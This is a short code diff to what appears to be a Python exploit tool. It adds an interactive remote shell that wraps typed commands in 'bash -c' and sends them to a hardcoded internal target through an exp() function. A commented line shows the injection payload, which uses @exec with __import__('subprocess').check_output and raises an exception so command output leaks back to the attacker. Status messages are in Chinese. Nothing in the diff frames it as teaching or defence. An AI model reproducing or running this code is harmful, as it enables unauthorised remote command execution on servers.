@@ -49,5 +49,30 @@ def run_post_exp_mul(config1, config2, url, save_dir, command):
     return content
 
 
-def shell():
-    print()
+def shell(cmd, url):
+    # command = f"['bash','-c','find /{cmd} -iname wochao.txt']"
+    command = f"['bash','-c','{cmd}']"
+    # config["data"] = "{\"code\": \"@exec(\\\"raise Exception(__import__('subprocess').check_output(" + command + "))\\\")\\ndef foo():\\n  pass\", \"a7fb98s8pvr\": \"=\"}"
+
+    resp = exp(config, url, command)
+    print(f"结果为： {resp}")
+    if resp and "'" in resp:
+        res = resp.split("'")[1].replace("\\\\r", "").split("\\\\n")
+        for i in res:
+            print(i)
+    else:
+        print("[-] 响应为空或格式不符合预期")
+        print(resp)
+    print(resp)
+
+    while 1:
+        try:
+            cmd = input("请输入命令： ").strip()
+            if cmd == "exit":
+                break
+            if cmd == "":
+                continue
+            url = "http://192.168.3.125:9191"
+            shell(cmd, url)
+        except Exception as e:
+            print(redStr(e))
